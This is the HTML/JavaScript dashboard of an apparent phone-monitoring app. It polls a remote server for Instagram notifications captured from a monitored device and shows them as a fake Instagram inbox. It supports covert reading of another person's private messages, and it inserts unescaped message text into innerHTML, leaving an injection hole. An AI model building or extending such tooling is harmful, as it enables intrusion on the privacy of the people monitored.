<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram DM Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- INSTAGRAM DARK THEME --- */
        body { 
            margin: 0; 
            background-color: #000; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            color: #fff; 
            height: 100vh; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            height: 100%;
            max-width: 450px;
            background-color: #000;
            position: relative;
            display: flex;
            flex-direction: column;
        }

        /* --- VIEW 1: DM LIST --- */
        #dmListView { display: flex; flex-direction: column; height: 100%; width: 100%; }

        .dm-header { 
            padding: 15px; display: flex; justify-content: space-between; align-items: center; height: 40px;
        }
        .username-top { font-weight: bold; font-size: 1.2rem; display: flex; align-items: center; gap: 5px; cursor: pointer; }
        .header-icons { display: flex; gap: 20px; font-size: 1.4rem; }
        
        .search-box { padding: 0 15px 10px 15px; }
        .search-input { width: 100%; background: #262626; border: none; padding: 8px 10px; border-radius: 10px; color: #a8a8a8; outline: none; box-sizing: border-box; }

        .dm-list { flex: 1; overflow-y: auto; padding-top: 5px; }
        
        .dm-item { 
            display: flex; align-items: center; padding: 10px 15px; cursor: pointer; transition: 0.2s; 
        }
        .dm-item:active { background: #1a1a1a; }

        .insta-dp { width: 54px; height: 54px; border-radius: 50%; background: #333; margin-right: 15px; overflow: hidden; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; color: #888; border: 1px solid #333; }
        
        .dm-info { flex: 1; }
        .dm-info h4 { margin: 0; font-weight: 400; font-size: 0.95rem; color: #fff; }
        .dm-info p { margin: 3px 0 0; color: #a8a8a8; font-size: 0.85rem; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden;}
        
        .camera-icon { margin-left: auto; color: #a8a8a8; font-size: 1.4rem; }

        /* --- VIEW 2: CHAT DETAIL --- */
        #chatView { 
            display: none; 
            flex-direction: column; height: 100%; 
            background: #000; 
            position: absolute; top: 0; left: 0; width: 100%; 
            z-index: 20; 
        }

        .chat-nav { 
            padding: 10px 15px; display: flex; align-items: center; 
            border-bottom: 1px solid #262626; height: 40px;
        }
        
        .chat-area { 
            flex: 1; padding: 15px; overflow-y: auto; 
            display: flex; flex-direction: column; gap: 4px; 
        }
        
        .msg { padding: 10px 16px; border-radius: 22px; max-width: 70%; font-size: 0.95rem; margin-bottom: 2px; line-height: 1.4; word-wrap: break-word;}
        
        .msg-in { 
            background: #262626; align-self: flex-start; color: #fff; border-bottom-left-radius: 5px;
        }
        .msg-time { font-size: 0.65rem; color: #888; display: block; margin-top: 5px; text-align: right;}

        .chat-input { padding: 15px; display: flex; align-items: center; gap: 15px; }
        .pill { flex: 1; background: #262626; padding: 12px 20px; border-radius: 25px; color: #fff; border: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }

    </style>
</head>
<body>

    <div class="app-container">

        <div id="dmListView">
            <div class="dm-header">
                <div class="username-top">
                    <span id="myUsername">instagram_user</span> 
                    <i class="fa-solid fa-chevron-down" style="font-size:0.7rem; margin-left: 5px;"></i>
                </div>
                <div class="header-icons">
                    <i class="fa-solid fa-video"></i>
                    <i class="fa-regular fa-pen-to-square"></i>
                </div>
            </div>
            
            <div class="search-box">
                <input type="text" class="search-input" placeholder="Search">
            </div>

            <div class="dm-list" id="instaList">
                <p style="text-align:center; padding-top:20px; color:#555">Loading Messages...</p>
            </div>
        </div>

        <div id="chatView">
            <div class="chat-nav">
                <i class="fa-solid fa-arrow-left" style="font-size:1.5rem; margin-right:20px; cursor:pointer;" onclick="closeInstaChat()"></i>
                <div class="insta-dp" style="width:30px; height:30px; margin-right:10px; font-size: 1rem;">
                    <i class="fa-solid fa-user"></i>
                </div>
                <div style="flex:1;">
                    <div style="font-weight:600; font-size: 0.95rem;" id="instaChatName">User</div>
                    <div style="font-size: 0.75rem; color: #a8a8a8;">Active today</div>
                </div>
                <i class="fa-solid fa-phone" style="font-size:1.4rem; margin-right:20px"></i>
                <i class="fa-solid fa-video" style="font-size:1.4rem"></i>
            </div>
            
            <div class="chat-area" id="instaMsgs">
            </div>
            
            <div class="chat-input">
                <div class="pill">
                    <span style="color:#ddd">Message...</span>
                    <i class="fa-regular fa-image" style="color:#fff"></i>
                </div>
            </div>
        </div>

    </div>

    <script>
        // --- LOGIC START ---

        const DEVICE_ID = localStorage.getItem('monitoring_id');
        const SERVER_URL = "https://child-v9no.onrender.com/api/get_data";

        if (!DEVICE_ID) {
            alert("Device ID Missing!");
            window.location.href = 'index.html'; 
        }

        let groupedInsta = {}; // Data store

        // 1. Data Fetching
        async function fetchInstaData() {
            try {
                const response = await fetch(`${SERVER_URL}?device_id=${DEVICE_ID}&type=chat_logs`);
                const result = await response.json();

                if (result.status === 'success' && result.data) {
                    processInstaData(result.data);
                }
            } catch (error) {
                console.error("Error:", error);
                document.getElementById('instaList').innerHTML = "<p style='text-align:center; color:#555'>Connection Failed</p>";
            }
        }

        // 2. Data Processing (The Brain)
        function processInstaData(logs) {
            groupedInsta = {}; // Clear old data

            logs.forEach(log => {
                if (log.app === 'Instagram') {
                    
                    let sender = log.title || ""; 
                    let messageContent = log.text || "";

                    // --- INTELLIGENT NAME CLEANING ---
                    // Kabhi kabhi "title" Instagram hota hai aur "text" naam hota hai (Jaise aapke data mein hai)
                    
                    if (sender === "Instagram" && !messageContent.includes(" ")) {
                        // Agar title Instagram hai aur message mein koi space nahi hai -> Matlab ye username hai
                        sender = messageContent;
                        messageContent = "[New Notification]"; // Placeholder
                    } else if (sender === "Instagram") {
                        // Agar title Instagram hai aur text lamba hai -> General Notification
                        sender = "Notifications";
                    } else if (!sender) {
                        // Agar title gayab hai, text ko username maan lo (Fallback)
                        if(!messageContent.includes(" ")) {
                            sender = messageContent;
                            messageContent = "Tap to view";
                        } else {
                            sender = "Unknown";
                        }
                    }

                    // --- GROUPING ---
                    if (!groupedInsta[sender]) {
                        groupedInsta[sender] = {
                            name: sender,
                            lastMsg: messageContent,
                            timestamp: log.timestamp,
                            msgs: []
                        };
                    }

                    // Add Message
                    groupedInsta[sender].msgs.push({
                        text: messageContent,
                        time: new Date(log.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                        fullTime: log.timestamp
                    });

                    // Update Last Message preview
                    groupedInsta[sender].lastMsg = messageContent;
                }
            });

            renderInstaList();
        }

        // 3. Render List
        function renderInstaList() {
            const list = document.getElementById('instaList');
            list.innerHTML = "";
            const users = Object.keys(groupedInsta);

            if(users.length === 0) {
                list.innerHTML = "<p style='text-align:center; color:#555; margin-top:20px'>No Instagram DMs found</p>";
                return;
            }

            users.forEach(user => {
                const u = groupedInsta[user];
                
                // Avatar Logic: "Notifications" ke liye alag icon
                let icon = '<i class="fa-solid fa-user"></i>';
                if(user === "Notifications") icon = '<i class="fa-solid fa-bell"></i>';

                list.innerHTML += `
                    <div class="dm-item" onclick="openInstaChat('${user}')">
                        <div class="insta-dp">${icon}</div>
                        <div class="dm-info">
                            <h4>${u.name}</h4>
                            <p>${u.lastMsg}</p>
                        </div>
                        <i class="fa-solid fa-camera camera-icon"></i>
                    </div>`;
            });
        }

        // 4. Open Chat
        function openInstaChat(userName) {
            const u = groupedInsta[userName];
            
            if(u) {
                document.getElementById('instaChatName').innerText = u.name;
                const box = document.getElementById('instaMsgs');
                box.innerHTML = "";
                
                // Sort messages
                u.msgs.sort((a,b) => a.fullTime - b.fullTime);

                u.msgs.forEach(m => {
                    box.innerHTML += `
                        <div class="msg msg-in">
                            ${m.text}
                            <span class="msg-time">${m.time}</span>
                        </div>`;
                });

                document.getElementById('dmListView').style.display = 'none';
                document.getElementById('chatView').style.display = 'flex';
                box.scrollTop = box.scrollHeight;
            }
        }

        function closeInstaChat() {
            document.getElementById('chatView').style.display = 'none';
            document.getElementById('dmListView').style.display = 'flex';
        }

        // Auto Refresh every 5 seconds
        fetchInstaData();
        setInterval(fetchInstaData, 5000);

    </script>
</body>
</html>
